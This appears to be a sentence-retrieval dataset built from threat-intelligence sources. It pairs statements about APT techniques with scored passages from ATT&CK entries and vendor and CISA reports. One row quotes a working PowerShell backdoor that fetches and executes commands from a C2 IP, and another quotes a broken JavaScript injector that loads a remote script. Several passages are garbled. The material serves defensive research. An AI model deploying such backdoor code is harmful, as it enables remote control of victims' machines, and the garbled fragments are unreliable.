'[11][7]EnterpriseT1136.001Create Account:Local AccountWizard Spiderhas created local administrator accounts to maintain persistence in compromised networks.', ""[7].002Create Account:Domain AccountWizard Spiderhas created and used new accounts within a victim's Active Directory environment to maintain persistence."", '[7]EnterpriseT1543.003Create or Modify System Process:Windows ServiceWizard Spiderhas installedTrickBotas a service named ControlServiceA in order to establish persistence.', '[6][7]EnterpriseT1555.004Credentials from Password Stores:Windows Credential ManagerWizard Spiderhas used PowerShell cmdletInvoke-WCMDumpto enumerate Windows credentials in the Credential Manager in a compromised network.']"
UNC2452 used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and to execute other commands.|0.7655159800218139|['Espionage Espionage activities conducted by Russian-affiliated APT groups target energy, aviation, transportation, healthcare, and telecommunications sectors, to name a few.', 'Russian intelligence services coordinate the operations to fulfil requirements ranging from developing cyber capabilities to foreign policy objectives [source].', '4.1.3.', 'Influence Russian Government-affiliated actors strive to weaken confidence in Western democratic systems through covert online journals and media outlets.', 'Moreover, APT groups are conducting hostile operations targeting government entities influencing national elections and leaking sensitive information such as medical records [source].', '4.2.', 'Tactics The most common tactics employed by Russian-sponsored APTs are: Reconnaissance Resource Development Initial Access Execution Persistence Credential Access Command and Control 4.2.1.', 'Reconnaissance When conducting reconnaissance, Russian state-sponsored APT actors often perform large-scale scans to find vulnerable servers.', 'Moreover, they typically conduct phishing and spear phishing operations to gain the credentials required to target specific networks.', '4.2.2.', 'Resource Development Russian state-sponsored APT actors develop and deploy their malware, sometimes combining zero-day exploits for espionage or destructive purposes.']
Turla RPC backdoors have also enumerated processes associated with specific open ports or named pipes.|0.7515106249770478|"['[14]EnterpriseT1120Peripheral Device DiscoveryTurlahas usedfsutil fsinfo drivesto list connected drives.', '[14]EnterpriseT1069.001Permission Groups Discovery:Local GroupsTurlahas usednet localgroupandnet localgroup Administratorsto enumerate group information, including members of the local administrators group.', '[14].002Permission Groups Discovery:Domain GroupsTurlahas usednet group ""Domain Admins"" /domainto identify domain administrators.', '[14]EnterpriseT1566.002Phishing:Spearphishing LinkTurlaattempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.', '[4]EnterpriseT1057Process DiscoveryTurlasurveys a system upon check-in to discover running processes using thetasklist /vcommand.', '[1]TurlaRPC backdoors have also enumerated processes associated with specific open ports or named pipes.', ""[11]EnterpriseT1055Process InjectionTurlahas also usedPowerSploit'sInvoke-ReflectivePEInjection.ps1to reflectively load a PowerShell payload into a random process on the victim system."", '[11].001Dynamic-link Library InjectionTurlahas used Metasploit to perform reflective DLL injection in order to escalate privileges.', '[16][23]EnterpriseT1090ProxyTurlaRPC backdoors have included local UPnP RPC proxies.', '[11].001Internal ProxyTurlahas compromised internal network systems to act as a proxy to forward traffic to C2.', '[10]EnterpriseT1012Query RegistryTurlasurveys a system upon check-in to discover information in the Windows Registry with thereg querycommand.']"
Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code.|0.8044867660184485|"['If the browser version contains a vulnerability, corresponding exploitation code gets run on the target system, potentially giving the attacker a remote code execution ability.', 'For these types of attacks, adversaries often leverage JavaScript.', 'For instance, according to a malware analysis report performed by Palo Alto, analyzing threat samples from April 2022 to June 2022, among all of the web threats detected during the research, JavaScript downloaders and redirectors were in the top 5 most leveraged web threats, infecting around 300 different domains [31].', 'Analysis shows that attackers often inject malicious JavaScript downloaders to a webpage owned by them, creating several new script elements that redirect website visitors to ads, spams, or any other malicious domains such as train[.]developfirstline[.', ']com: .', '.', '.', 'Element.prototype.appendAfter = function(element) { element.parentNode.insertBefore(this, element.nextSibling) ), false(function () { var elem = document.createElement(\'script"") elem.type = \'text / javascript\' elem.sc = \'https://train.developfirstline.com/delivery.js?s=3\' elem.appendAfter(document.getElementsByTagName(\'script\')(0]) elem.appendAfter(document.getElementsByTagName(""\'head\')[0]) document.getElementsByTagName(\'head\')(01.appendChild(elem) .', '.', '.', '37#1.8.']"
Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.|0.7891502660556764|['access; the resurrection of Emotet, a threat described by Europol as the most dangerous malware in You can listen to the latest episodes via the most popular podcast platforms including Spotify the world; and the over 400-fold increase in Android banking malware year-over-year.', '[154], Google Podcasts [155], Apple Podcasts [156] and PodBean [157].', 'MITRE ATT&CK CONTRIBUTIONS ESET researchers regularly contribute to MITRE ATT&CK [158] a globally accessible knowledge base of adversary tactics and techniques.', 'In T1 2022, ESETs Process Injection: ListPlanting [159] contribution was added to the ATT&CK knowledge base.', 'ListPlanting is a method of executing arbitrary code in the address space of a separate live process.', 'Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.', 'InvisiMole uses ListPlanting to inject code into a trusted process.', 'InvisiMole [160] is a modular spyware program that has been used by the InvisiMole APT group since WHITE PAPERS at least 2013.', 'The InvisiMole group also has two backdoor modules called RC2FM and RC2CL that are used to perform post-exploitation activities.', 'It has been discovered on compromised victims in Ukraine and Russia.', 'Gamaredon group [161] infrastructure has been used to download and execute Under the hood of Wslinks multilayered virtual machine [36] the InvisiMole spyware against a small number of victims.']
Sharpshooter has leveraged embedded shellcode to inject a downloader into the memory of Word.|0.8588317481805223|['The McAfee Advanced Threat Connect With Us This research has uncovered a new implant framework Research team has observed that the majority of targets using code from the 2015 backdoor Duuzer, which was were defense and government-related organizations.', '2 Operation SharpshooterREPORT Campaign Analysis This operation began October 25.', 'A series of malicious documents carried the authors name Richard.', 'These documents contained Korean-language metadata, indicating they were created with a Korean version of Microsoft Word.', 'All the malicious documents had English-language job description titles for positions at unknown companies, distributed by an IP address in the United States and through the Dropbox service.', 'The documents contained a malicious macro that leveraged embedded shellcode to inject the Sharpshooter downloader into the memory of Word.', 'Once the Word process was infected, the downloader retrieved the second-stage implant Rising Sun.', 'The shellcode of the downloader is 3.1KB in size and retrieved another implant hosted at hxxps://www.kingkoil.com.sg/query.php.', 'Figure 1.', 'Targeted organizations by sector in October 2018.', 'Colors indicate the most prominently affected sector in each country.']
Machete's main backdoor Machete is also written in Python.|0.7970717660298715|['-  -  .', 'Hi-Tech Crime Trends  ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,  ,  .', 'Hi-Tech Crime Trends  -  ,  ,  .', 'Group-IB  ,  ,  -  -  .', '.', 'Group-IB:  ,  ,  Leaks  ,  ,  ,  ,  ,  Group-IB  ,  ,  ,  ,  ,  GROUP-IB.RU  6  Group-IB  Hi-Tech Crime Trends,  .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB  , ,  - .', ',  Group-IB  ,  .', ', - -  .']
MuddyWater has used developed tools in Python including Out1.|0.7659486090443643|['Attachment Phishing: T1566.002 MuddyWater has sent targeted spearphishing emails with malicious links.', 'Spearphishing Link Execution Windows T1047 MuddyWater has used malware that leveraged Windows Management Management Instrumentation for execution and querying host information.', 'Instrumentation Command and T1059.001 MuddyWater has used PowerShell for execution.', 'Scripting Interpreter: PowerShell Command and 1059.003 MuddyWater has used a custom tool for creating reverse shells.', 'Scripting Interpreter: Windows Command Shell Command and T1059.005 MuddyWater has used Virtual Basic Script (VBS) files to execute its POWERSTATS Scripting Interpreter: payload, as well as macros.', 'Visual Basic Command and T1059.006 MuddyWater has used developed tools in Python including Out1.', 'Scripting Interpreter: Python Command and T1059.007 MuddyWater has used JavaScript files to execute its POWERSTATS payload.', 'Scripting Interpreter: JavaScript Exploitation for T1203 MuddyWater has exploited the Office vulnerability CVE-2017-0199 for execution.', 'Client Execution User Execution: T1204.001 MuddyWater has distributed URLs in phishing emails that link to lure documents.', 'Malicious Link User Execution: T1204.002 MuddyWater has attempted to get users to enable macros and launch malicious Malicious File Microsoft Word documents delivered via spearphishing emails.', '4/12Technique Title ID Use Inter-Process T1559.001 MuddyWater has used malware that has the capability to execute malicious code via Communication: COM, DCOM, and Outlook.']
Turla has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes .|0.857044356698307|"[""[11]EnterpriseT1055Process InjectionTurlahas also usedPowerSploit'sInvoke-ReflectivePEInjection.ps1to reflectively load a PowerShell payload into a random process on the victim system."", '[11].001Dynamic-link Library InjectionTurlahas used Metasploit to perform reflective DLL injection in order to escalate privileges.', '[16][23]EnterpriseT1090ProxyTurlaRPC backdoors have included local UPnP RPC proxies.', '[11].001Internal ProxyTurlahas compromised internal network systems to act as a proxy to forward traffic to C2.', '[10]EnterpriseT1012Query RegistryTurlasurveys a system upon check-in to discover information in the Windows Registry with thereg querycommand.', '[1]Turlahas also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes .', '[11]EnterpriseT1021.002Remote Services:SMB/Windows Admin SharesTurlausednet usecommands to connect to lateral systems within a network.', '[1]EnterpriseT1018Remote System DiscoveryTurlasurveys a system upon check-in to discover remote systems on a local network using thenet viewandnet view /DOMAINcommands.Turlahas also usednet group ""Domain Computers"" /domain,net group ""Domain Controllers"" /domain, andnet group ""Exchange Servers"" /domainto enumerate domain computers, including the organization\'s DC and Exchange Server.', '[1][14]EnterpriseT1518.001Software Discovery:Security Software DiscoveryTurlahas obtained information on security software, including security logging information that may indicate whether their malware has been detected.', '[14]EnterpriseT1553.006Subvert Trust Controls:Code Signing Policy ModificationTurlahas modified variables in kernel memory to turn off Driver Signature Enforcement after exploiting vulnerabilities that obtained kernel mode privileges.', '[22][24]EnterpriseT1082System Information DiscoveryTurlasurveys a system upon check-in to discover operating system configuration details using thesysteminfoandsetcommands.']"
NanHaiShu modifies the %regrun% Registry to point itself to an autostart mechanism.|0.7726336132016277|['IMAGE 6: VBA MACRO DECODES AND EXECUTES THE JSCRIPT 6 NANHAISHU RATing the South China SeaIn most of the samples, two sets of Base64 encoded files are embedded in the VBA macro.', 'For the recent sample, the VBA macro will decode and first write JScript data to %appdata%\\\Microsoft\\\Network\\\network.js, then execute it.', 'IMAGE 7: VBA MACRO DECODES & OPENS DECOY XLS FILE The macro then decodes a decoy XLS file, which it saves to the current directory using the same filename as the malicious XLS.', 'The decoy is then loaded.', 'Finally, the macro creates a VBScript file that will delete the original file.', 'Meanwhile, the network.js modifies the %regrun% registry to point to itself as its autostart mechanism.', 'The code will proceed to retrieve the following system information (Image 8, next page) and upload it to the C&C server: 1.', 'Volume Serial Number 2.', 'IP Address 3.', 'Computer Name 4.', 'User Name 5.']
Additionally, a Turla custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.|0.7583338717586615|"['[14]EnterpriseT1583.006Acquire Infrastructure:Web ServicesTurlahas created web accounts including Dropbox and GitHub for C2 and document exfiltration.', '[15]EnterpriseT1071.001Application Layer Protocol:Web ProtocolsTurlahas used HTTP and HTTPS for C2 communications.', '[4][16].003Application Layer Protocol:Mail ProtocolsTurlahas used multiple backdoors which communicate with a C2 server via email attachments.', '[17]EnterpriseT1560.001Archive Collected Data:Archive via UtilityTurlahas encrypted files stolen from connected USB drives into a RAR file before exfiltration.', '[18]EnterpriseT1547.001Boot or Logon Autostart Execution:Registry Run Keys / Startup FolderATurlaJavascript backdoor added a local_update_check value under the Registry keyHKLM\\\SOFTWARE\\\Microsoft\\\Windows\\\CurrentVersion\\\Runto establish persistence.', 'Additionally, aTurlacustom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.', '[4][16].004Boot or Logon Autostart Execution:Winlogon Helper DLLTurlaestablished persistence by adding a Shell value under the Registry keyHKCU\\\Software\\\Microsoft\\\Windows NT\\\CurrentVersion\\\Winlogon.', ""[4]EnterpriseT1110Brute ForceTurlamay attempt to connect to systems within a victim's network usingnet usecommands and a predefined list or collection of passwords."", ""[1]EnterpriseT1059.001Command and Scripting Interpreter:PowerShellTurlahas used PowerShell to execute commands/scripts, in some cases via a custom executable or code fromEmpire's PSInject."", '[16][11][18]Turlahas also used PowerShell scripts to load and execute malware in memory..003Command and Scripting Interpreter:Windows Command ShellTurlaRPC backdoors have used cmd.exe to execute commands.', '[11][18].005Command and Scripting Interpreter:Visual BasicTurlahas used VBS scripts throughout its operations.']"
The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.|1.0|['EnterpriseT1548.002Abuse Elevation Control Mechanism:Bypass User Account ControlCobalt Grouphas bypassed UAC.', '[4]EnterpriseT1071.001Application Layer Protocol:Web ProtocolsCobalt Grouphas used HTTPS for C2.', '[1][3][4].004Application Layer Protocol:DNSCobalt Grouphas used DNS tunneling for C2.', '[1][3][4]EnterpriseT1547.001Boot or Logon Autostart Execution:Registry Run Keys / Startup FolderCobalt Grouphas used Registry Run keys for persistence.', 'The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.', '[4]EnterpriseT1037.001Boot or Logon Initialization Scripts:Logon Script (Windows)Cobalt Grouphas added persistence by registering the file name for the next stage malware underHKCU\\\Environment\\\UserInitMprLogonScript.', '[11]EnterpriseT1059.001Command and Scripting Interpreter:PowerShellCobalt Grouphas used powershell.exe to download and execute scripts.', '[1][2][3][4][7][12].003Command and Scripting Interpreter:Windows Command ShellCobalt Grouphas used a JavaScript backdoor that is capable of launching cmd.exe to execute shell commands.', '[11]The group has used an exploit toolkit known as Threadkit that launches .bat files.', '[1][2][4][11][13][12].005Command and Scripting Interpreter:Visual BasicCobalt Grouphas sent Word OLE compound documents with malicious obfuscated VBA macros that will run upon user execution.']
The group has also used regsvr32 to run their backdoor.|1.0|"['[2]EnterpriseT1072Software Deployment ToolsAPT32compromised McAfee ePO to move laterally by distributing malware as a software deployment task.', '[1]EnterpriseT1608.001Stage Capabilities:Upload MalwareAPT32has hosted malicious payloads in Dropbox, Amazon S3, and Google Drive for use during targeting.', '[9].004Stage Capabilities:Drive-by TargetAPT32has stood up websites containing numerous articles and content scraped from the Internet to make them appear legitimate, but some of these pages include malicious JavaScript to profile the potential victim or infect them via a fake software update.', '[9]EnterpriseT1218.005System Binary Proxy Execution:MshtaAPT32has used mshta.exe for code execution.', '[4][8].010System Binary Proxy Execution:Regsvr32APT32created aScheduled Task/Jobthat used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory.', 'The group has also used regsvr32 to run their backdoor.', '[5][1][8].011System Binary Proxy Execution:Rundll32APT32malware has used rundll32.exe to execute an initial infection process.', '[8]EnterpriseT1082System Information DiscoveryAPT32has collected the OS version and computer name from victims.', ""One of the group's backdoors can also query the Windows Registry to gather system information, and another macOS backdoor performs a fingerprint of the machine on its first connection to the C&C server.APT32executed shellcode to identify the name of the infected host."", '[3][5][10][13]EnterpriseT1016System Network Configuration DiscoveryAPT32used theipconfig /allcommand to gather the IP address from the system.', ""[8]EnterpriseT1049System Network Connections DiscoveryAPT32used thenetstat -anpo tcpcommand to display TCP connections on the victim's machine.""]"
MAPIGET steals email still on Exchange servers that has not yet been archived.|1.0002|"['[1]EnterpriseT1584.001Compromise Infrastructure:DomainsAPT1hijacked FQDNs associated with legitimate websites hosted by hop points.', '[1]EnterpriseT1005Data from Local SystemAPT1has collected files from a local victim.', '[1]EnterpriseT1114.001Email Collection:Local Email CollectionAPT1uses two utilities, GETMAIL and MAPIGET, to steal email.', 'GETMAIL extracts emails from archived Outlook .pst files.', '[1].002Email Collection:Remote Email CollectionAPT1uses two utilities, GETMAIL and MAPIGET, to steal email.', 'MAPIGET steals email still on Exchange servers that has not yet been archived.', '[1]EnterpriseT1585.002Establish Accounts:Email AccountsAPT1has created email accounts for later use in social engineering, phishing, and when registering domains.', ""[1]EnterpriseT1036.005Masquerading:Match Legitimate Name or LocationThe file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used byAPT1as a name for malware."", '[1][3]EnterpriseT1135Network Share DiscoveryAPT1listed connected network shares.', '[1]EnterpriseT1588.001Obtain Capabilities:MalwareAPT1used publicly available malware for privilege escalation.', '[1].002Obtain Capabilities:ToolAPT1has used various open-source tools for privilege escalation purposes.']"
InvisiMole has used rundll32.exe for execution.|0.7620105332619023|['ESET Research white papers TLP: WHITE INVISIMOLE: THE HIDDEN PART OF THE STORY UNEARTHING INVISIMOLES ESPIONAGE TOOLSET AND STRATEGIC COOPERATIONS Authors: Zuzana Hromcov Anton CherepanovTLP: WHITE 2 InvisiMole: The hidden part of the story CONTENTS 1 EXECUTIVE SUMMARY  4 2 ATTACKS AND INVESTIGATION  4 2.1 InvisiMoles toolset .', '.', '.', '.', '.', '.', '.']
APT38 has used DYEPACK.FOX to manipulate PDF data as it is accessed to remove traces of fraudulent SWIFT transactions from the data displayed to the end user.|0.7731522137658291|[]
They also manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration.|0.888180202738702|['Lateral Movement Using Different Credentials 3/9Once the attacker gained access to the network with compromised credentials, they moved laterally using multiple different credentials.', 'The credentials used for lateral movement were always different from those used for remote access.', 'Detection Opportunity Organizations can use HXs LogonTracker module to graph all logon activity and analyze systems displaying a one-to- many relationship between source systems and accounts.', 'This will uncover any single system authenticating to multiple systems with multiple accounts, a relatively uncommon occurrence during normal business operations.', 'Temporary File Replacement and Temporary Task Modification The attacker used a temporary file replacement technique to remotely execute utilities: they replaced a legitimate utility with theirs, executed their payload, and then restored the legitimate original file.', 'They similarly manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returning the scheduled task to its original configuration.', 'They routinely removed their tools, including removing backdoors once legitimate remote access was achieved.', 'Detection Opportunity Defenders can examine logs for SMB sessions that show access to legitimate directories and follow a delete-create- execute-delete-create pattern in a short amount of time.', 'Additionally, defenders can monitor existing scheduled tasks for temporary updates, using frequency analysis to identify anomalous modification of tasks.', 'Tasks can also be monitored to watch for legitimate Windows tasks executing new or unknown binaries.', 'This campaigns post compromise activity was conducted with a high regard for operational security, in many cases leveraging dedicated infrastructure per intrusion.']
They also manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration.|0.8029534719366086|['[18].006Remote Services:Windows Remote ManagementDuring theSolarWinds Compromise,APT29used WinRM via PowerShell to execute commands and payloads on remote hosts.', '[43].007Remote Services:Cloud ServicesAPT29has leveraged compromised high-privileged on-premises accounts synced to Office 365 to move laterally into a cloud environment, including through the use of Azure AD PowerShell.', '[49]EnterpriseT1018Remote System DiscoveryDuring theSolarWinds Compromise,APT29usedAdFindto enumerate remote systems.', '[37]EnterpriseT1053.005Scheduled Task/Job:Scheduled TaskAPT29has used named and hijacked scheduled tasks to establish persistence.', '[30]During theSolarWinds Compromise,APT29usedschedulerandschtasksto create new tasks on remote host as part of their lateral movement.', 'They manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration.APT29also created a scheduled task to maintainSUNSPOTpersistence when the host booted.', '[12][9][11]EnterpriseT1505.003Server Software Component:Web ShellAPT29has installed web shells on exploited Microsoft Exchange servers.', '[13][27]EnterpriseT1528Steal Application Access TokenAPT29uses stolen tokens to access victim accounts, without needing a password.', '[34]EnterpriseT1649Steal or Forge Authentication CertificatesAPT29has abused misconfigured AD CS certificate templates to impersonate admin users and create additional authentication certificates.', '[50]EnterpriseT1558.003Steal or Forge Kerberos Tickets:KerberoastingDuring theSolarWinds Compromise,APT29obtained Ticket Granting Service (TGS) tickets for Active Directory Service Principle Names to crack offline.', '[37]EnterpriseT1539Steal Web Session CookieDuring theSolarWinds Compromise,APT29stole Chrome browser cookies by copying the Chrome profile directories of targeted users.']
Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.|1.0|['l 38 T1543.003: Windows Service2021 Threat Detection Report TECHNIQUE T1053 Scheduled Task/Job #4 Scheduled Task/Job ranks fourth this year thanks in large part to detections OVERALL RANK associated with its Scheduled Task sub-technique.', '32.8% T1053.005 Scheduled Task ORGANIZATIONS AFFECTED 27.6% 2,740 ORGANIZATIONS AFFECTED CONFIRMED THREATS 3,258 The primary task-scheduling component of Windows, this technique allows adversarial persistence and execution behaviors to blend in with routine activity emanating from native tools and third-party CONFIRMED THREATS software.', 'SEE MORE > T1053: SCHEDULED TASK/JOB Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code.', 'Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time.', 'A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments).', 'Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.', '39 SEUQINHCET-BUS TNELAVERP l 39 T1053: Scheduled Task/Job2021 Threat Detection Report TECHNIQUE T1053.005 Scheduled Task #4 Leveraging the primary task-scheduling component of Windows, this technique PARENT TECHNIQUE RANK allows adversarial persistence and execution behaviors to blend in with routine activity emanating from native tools and third-party software.', '27.6% Analysis ORGANIZATIONS AFFECTED Why do adversaries use Scheduled Task?', '2,740 Adversaries use scheduled tasks to accomplish two primary objectives: maintaining access and executing processes in a specific user context, typically one with elevated privileges.', 'As a wide variety of legitimate software uses CONFIRMED THREATS scheduled tasks for an even wider variety of legitimate reasons, malicious use often blends in with innocuous use.', 'Scheduled tasks are a functionally necessary component of the Windows operating system that cant just be turned off or blocked.']
Several Microsoft signed scripts that are default on Windows installations can be used to proxy execution of other files.|0.902419960492048|['l 19 T1059.003: Windows Command Shell2021 Threat Detection Report TECHNIQUE T1218 Signed Binary #2 Proxy Execution OVERALL RANK Signed Binary Proxy Execution ranks second this year thanks in large part to detections associated with two of its sub-techniques: Rundll32 and Mshta.', '49.3% T1218.011 ORGANIZATIONS AFFECTED Rundll32 30% 2,380 3,755 ORGANIZATIONS AFFECTED CONFIRMED THREATS Adversaries use this native Windows process to execute malicious code through dynamic link libraries (DLL), often to bypass CONFIRMED THREATS application controls.', 'SEE MORE > T1218.005 Mshta 18.8% 738 ORGANIZATIONS AFFECTED CONFIRMED THREATS Mshta is attractive to adversaries both in the early and latter stages of an infection because it enables them to proxy the execution of arbitrary code through a trusted utility.', 'SEE MORE > T1218: SIGNED BINARY PROCESS EXECUTION Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries.', 'Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation.', 'Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.', '20 SEUQINHCET-BUS TNELAVERP l 20 T1218: Signed Binary Proxy Execution2021 Threat Detection Report TECHNIQUE T1218.011 Rundll32 #2 Adversaries use this native Windows process to execute malicious code through PARENT TECHNIQUE RANK dynamic link libraries (DLL), often to bypass application controls.', 'Analysis 30% Why do adversaries use Rundll32?', 'ORGANIZATIONS AFFECTED Like many of the most prevalent ATT&CK techniques, Rundll32 is a native Windows process thats installed by default on nearly every Microsoft computer 2,380 dating back to Windows 95.', 'It is a functionally necessary component of the Windows operating system that cant be simply blocked or disabled.', 'This necessity and ubiquity makes Rundll32 an attractive target for adversaries CONFIRMED THREATS intent on blending in.']
Rather than creating and cultivating social media profiles Social Media Accounts, adversaries may compromise existing social media accounts.|0.7582032411841296|"['PC  ,  .', '[ 1-1]  \'CVE-2022-41128\'  3InternetExplorer0-dayexploitedbyNorthKoreanactorAPT37 4[]\'\' 5"""" Genians Security Center 3Threat Intelligence Report 2.', '(Attack Scenario) 2.1.', '/  (Initial Access / Infection Vectors)  .', 'HWPX, HWP, LNK(XLSX ), DOCX  ,  XLSX  .', '.', ',  .', '.', '2.2.', '(Spear Phishing Attachment)  7  .', ', HWPX  .']"
MuddyWater has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients.|0.7988071142847077|"['The script is lightweight in functionality and uses the InvokeScript method to execute responses received from the adversary.', ""function encode($txt,$key){$enByte = [Text.Encoding]::UTF8.GetBytes($txt);for($i=0; $i -lt $enByte.count ; $i++) {$enByte[$i] = $enByte[$i] -bxor $key;}$encodetxt = [Convert]::ToBase64String($enByte);return $encodetxt;}function decode($txt,$key){$enByte = [System.Convert]::FromBase64String($txt);for($i=0; $i -lt $enByte.count ; $i++){$enByte[$i] = $enByte[$i] -bxor $key;}$dtxt = [System.Text.Encoding]::UTF8.GetString($enByte);return $dtxt;}$global:tt=20;while($true){try{$w = [System.Net.HttpWebRequest]::Create('http://95.181.161.49:80/index.php?id= <victim identifier>');$w.proxy = [Net.WebRequest]::GetSystemWebProxy();$r=(New-Object System.IO.StreamReader($w.GetResponse().GetResponseStream())).ReadToEnd();if($r.Length -gt 0){$res= 3/12[string]$ExecutionContext.InvokeCommand.InvokeScript(( decode $r 2));$wr = [System.Net.HttpWebRequest]::Create('http://95.181.161.49:80/index.php?id=<victim identifier>');$wr.proxy = [Net.WebRequest]::GetSystemWebProxy();$wr.Headers.Add('cookie',(encode $res 2));$wr.GetResponse().GetResponseStream();}}catch {}Start-Sleep -Seconds $global:tt;} MITRE ATT&CK Techniques MuddyWater uses the ATT&CK techniques listed in table 1."", 'Table 1: MuddyWater ATT&CK Techniques[2] Technique Title ID Use Reconnaissance Gather Victim T1589.002 MuddyWater has specifically targeted government agency employees with Identity Information: spearphishing emails.', 'Email Addresses Resource Development Acquire T1583.006 MuddyWater has used file sharing services including OneHub to distribute tools.', 'Infrastructure: Web Services Obtain Capabilities: T1588.002 MuddyWater has made use of legitimate tools ConnectWise and RemoteUtilities for Tool access to target environments.', 'Initial Access Phishing: T1566.001 MuddyWater has compromised third parties and used compromised accounts to Spearphishing send spearphishing emails with targeted attachments.', 'Attachment Phishing: T1566.002 MuddyWater has sent targeted spearphishing emails with malicious links.', 'Spearphishing Link Execution Windows T1047 MuddyWater has used malware that leveraged Windows Management Management Instrumentation for execution and querying host information.', 'Instrumentation Command and T1059.001 MuddyWater has used PowerShell for execution.', 'Scripting Interpreter: PowerShell Command and 1059.003 MuddyWater has used a custom tool for creating reverse shells.', 'Scripting Interpreter: Windows Command Shell Command and T1059.005 MuddyWater has used Virtual Basic Script (VBS) files to execute its POWERSTATS Scripting Interpreter: payload, as well as macros.']"
In some cases the URLs were shortened or linked to Word documents with malicious macros that executed PowerShells scripts to download Pupy.|0.7834412683948093|['[15][19]EnterpriseT1027.010Obfuscated Files or Information:Command ObfuscationMagic Houndhas used base64-encoded commands.', '[15][18].013Obfuscated Files or Information:Encrypted/Encoded FileMagic Houndmalware has used base64-encoded files and has also encrypted embedded strings with AES.', '[15][18]EnterpriseT1588.002Obtain Capabilities:ToolMagic Houndhas obtained and used tools likeHavij,sqlmap, Metasploit,Mimikatz, and Plink.', '[23][1][7][19][18]EnterpriseT1003.001OS Credential Dumping:LSASS MemoryMagic Houndhas stolen domain credentials by dumping LSASS process memory using Task Manager, comsvcs.dll, and from a Microsoft Active Directory Domain Controller usingMimikatz.', '[1][17][19][18]EnterpriseT1566.002Phishing:Spearphishing LinkMagic Houndhas sent malicious URL links through email to victims.', 'In some cases the URLs were shortened or linked to Word documents with malicious macros that executed PowerShells scripts to downloadPupy.', '[24][2][3][18].003Phishing:Spearphishing via ServiceMagic Houndused various social media channels (such as LinkedIn) as well as messaging services (such as WhatsApp) to spearphish victims.', '[25][12][2]EnterpriseT1598.003Phishing for Information:Spearphishing LinkMagic Houndhas used SMS and email messages with links designed to steal credentials or track victims.', '[3][2][6][5][20][18]EnterpriseT1057Process DiscoveryMagic Houndmalware can list running processes.', '[15]EnterpriseT1572Protocol TunnelingMagic Houndhas used Plink to tunnel RDP over SSH.', '[19]EnterpriseT1090ProxyMagic Houndhas used Fast Reverse Proxy (FRP) for RDP traffic.']
Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting.|0.8511003712593138|"['Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than Asymmetric Cryptography T1573.002 relying on any inherent protections provided by a communication protocol.', 'Adversaries may execute their own malicious payloads by side- DLL Side-Loading T1574.002 loading DLLs.', 'Adversaries may compromise third-party infrastructure that can Compromise Infrastructure T1584 be used during targeting.', 'Adversaries may develop malware and malware components that Malware T1587.001 can be used during targeting.', 'Page 46 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may buy and/or steal capabilities that can be used Obtain Capabilities T1588 during targeting.', 'Adversaries may upload, install, or otherwise set up capabilities Stage Capabilities T1608 that can be used during targeting.', 'Adversaries may deploy a container into an environment to Deploy Container T1610 facilitate execution or evade defenses.', 'Volatility Plugin The following plugin for the Volatility memory analysis framework will scan all processes on the system until it finds the Snake user mode component injected into a process.', 'If found, the plugin will list both the injected process and the virtual memory address at which the Snake user mode component is loaded.', '# This plugin to identify the injected usermode component of Snake is based # on the malfind plugin released with Volatility3 # # This file is Copyright 2019 Volatility Foundation and licensed under the # Volatility Software License 1.0 # which is available at https://www.volatilityfoundation.org/license/vsl-v1.0 import logging from typing import Iterable, Tuple from volatility3.framework import interfaces, symbols, exceptions, renderers from volatility3.framework.configuration import requirements from volatility3.framework.objects import utility from volatility3.framework.renderers import format_hints from volatility3.plugins.windows import pslist, vadinfo vollog = logging.getLogger(__name__) class snake(interfaces.plugins.PluginInterface): _required_framework_version = (2, 4, 0) @classmethod def get_requirements(cls): return [ requirements.ModuleRequirement(name = \'kernel\', description = \'Windows kernel\', architectures = [""Intel32"", ""Intel64""]), requirements.VersionRequirement(name = \'pslist\', component = pslist.PsList, version = (2, 0, 0)), requirements.VersionRequirement(name = \'vadinfo\', component = vadinfo.VadInfo, version = (2, 0, 0))] @classmethod def list_injections( cls, context: interfaces.context.ContextInterface, kernel_layer_name: str, symbol_table: str, proc: interfaces.objects.ObjectInterface) -> Iterable[ Tuple[interfaces.objects.ObjectInterface, bytes]]: proc_id = ""Unknown"" try: Page 47 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership proc_id = proc.UniqueProcessId proc_layer_name = proc.add_process_layer() except exceptions.InvalidAddressException as excp: vollog.debug(""Process {}: invalid address {} in layer {}"".', 'format(proc_id, excp.invalid_address, excp.layer_name)) return proc_layer = context.layers[proc_layer_name] for vad in proc.get_vad_root().traverse(): protection_string = 